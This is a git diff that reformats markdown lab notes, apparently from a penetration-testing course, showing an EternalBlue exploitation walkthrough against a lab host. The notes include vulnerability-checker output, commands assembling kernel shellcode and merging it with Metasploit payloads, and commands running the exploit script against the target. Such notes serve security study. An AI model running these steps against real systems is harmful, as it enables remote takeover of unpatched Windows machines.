@@ -44,6 +44,7 @@ Anonymous user (null session) get more restriction on default settings of new Wi
 ## Compilation
 Eternal Blue
 
+```
 $ python ../checker.py 10.11.1.230
 Target OS: Windows 7 Ultimate N 7600
 The target is not patched
@@ -54,7 +55,7 @@ samr: STATUS_ACCESS_DENIED
 netlogon: STATUS_ACCESS_DENIED
 lsarpc: STATUS_ACCESS_DENIED
 browser: STATUS_ACCESS_DENIED
-
+```
 Then we use the vulnerability EternalBlue instead of EternalChampion.
 ```bash
 nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
@@ -66,8 +67,12 @@ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
 ```
 
 A) both versions of OS
-$ python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
-$ python ../eternalblue_exploit7.py 10.11.1.230 sc_all.bin
+```bash
+python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+python ../eternalblue_exploit7.py 10.11.1.230 sc_all.bin
+```
 
 B) x86
-$ python ../eternalblue_exploit7.py 10.11.1.230 sc_x86.bin
+```bash
+python ../eternalblue_exploit7.py 10.11.1.230 sc_x86.bin
+```
